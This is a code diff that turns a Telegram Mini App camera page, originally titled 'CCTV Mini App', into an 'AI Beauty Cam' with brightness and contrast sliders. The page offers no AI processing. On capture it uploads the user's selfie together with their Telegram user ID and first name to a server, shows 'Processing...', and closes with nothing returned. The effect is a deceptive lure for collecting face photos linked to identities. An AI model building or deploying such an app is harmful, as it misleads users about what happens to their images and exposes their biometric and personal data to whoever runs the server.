@@ -1,68 +1,91 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CCTV Mini App</title>
+    <title>AI Beauty Cam</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { text-align: center; font-family: sans-serif; background: #1a1a1a; color: white; padding: 20px; }
-        video { width: 100%; max-width: 400px; border-radius: 10px; border: 2px solid #0088cc; }
-        button { 
-            padding: 15px 30px; font-size: 16px; background: #0088cc; 
-            color: white; border: none; border-radius: 50px; margin-top: 20px;
-            font-weight: bold; width: 80%;
+        :root { --primary: #ff4d94; --bg: #0f0f0f; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; padding: 20px; }
+        
+        .cam-container { position: relative; width: 100%; max-width: 400px; margin: auto; border-radius: 20px; overflow: hidden; border: 3px solid var(--primary); box-shadow: 0 0 20px rgba(255, 77, 148, 0.4); }
+        video { width: 100%; display: block; transform: scaleX(-1); } /* Mirror view */
+        
+        .controls { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 15px; border-radius: 20px; margin-top: 15px; }
+        .slider-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 15px; }
+        input[type="range"] { accent-color: var(--primary); }
+        
+        button#capture { 
+            background: linear-gradient(45deg, #ff4d94, #ff80b3); 
+            border: none; padding: 15px 40px; border-radius: 50px; 
+            color: white; font-weight: bold; font-size: 18px; 
+            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.4); cursor: pointer;
         }
+        button:disabled { background: #555; }
     </style>
 </head>
 <body>
-    <h3>Camera System</h3>
-    <video id="video" autoplay playsinline></video>
-    <br>
-    <button id="capture">ဓာတ်ပုံရိုက်မည်</button>
+    <h2 style="color: var(--primary);">✨ AI Beauty Cam</h2>
+    
+    <div class="cam-container">
+        <video id="video" autoplay playsinline></video>
+    </div>
+
+    <div class="controls">
+        <div class="slider-group">
+            <label>Brightness (ကြည်လင်မှု)</label>
+            <input type="range" id="bright" min="100" max="200" value="120">
+            <label>Contrast (အရောင်တောက်မှု)</label>
+            <input type="range" id="contrast" min="100" max="150" value="110">
+        </div>
+        <button id="capture">📸 ဓာတ်ပုံရိုက်မည်</button>
+    </div>
+    
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
-        const captureButton = document.getElementById('capture');
+        const captureBtn = document.getElementById('capture');
         const canvas = document.getElementById('canvas');
         const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+        tg.ready(); tg.expand();
+
+        // Filters update
+        const updateFilters = () => {
+            const b = document.getElementById('bright').value;
+            const c = document.getElementById('contrast').value;
+            video.style.filter = `brightness(${b}%) contrast(${c}%)`;
+        };
+        document.querySelectorAll('input').forEach(i => i.oninput = updateFilters);
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => { video.srcObject = stream; })
-            .catch(err => alert("Camera Error"));
+            .then(s => video.srcObject = s);
 
-        captureButton.addEventListener('click', async () => {
-            const context = canvas.getContext('2d');
+        captureBtn.onclick = async () => {
+            const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Apply current filters to canvas
+            ctx.filter = video.style.filter;
+            ctx.translate(canvas.width, 0); ctx.scale(-1, 1); // Mirror fix
+            ctx.drawImage(video, 0, 0);
             
             const imageData = canvas.toDataURL('image/jpeg', 0.8);
-            captureButton.innerText = "ပို့နေသည်...";
-            captureButton.disabled = true;
+            captureBtn.innerText = "Processing...";
+            captureBtn.disabled = true;
 
-            // သင့်ရဲ့ Render Server URL ဆီသို့ ပို့ခြင်း
-            try {
-                const response = await fetch('/upload', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        image: imageData,
-                        user_id: tg.initDataUnsafe.user.id,
-                        user_name: tg.initDataUnsafe.user.first_name
-                    })
-                });
-
-                if (response.ok) {
-                    tg.close();
-                } else {
-                    alert("ပို့၍မရပါ");
-                }
-            } catch (e) {
-                alert("Error: " + e);
-            }
-        });
+            await fetch('/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    image: imageData,
+                    user_id: tg.initDataUnsafe.user.id,
+                    user_name: tg.initDataUnsafe.user.first_name
+                })
+            });
+            tg.close();
+        };
     </script>
 </body>
 </html>
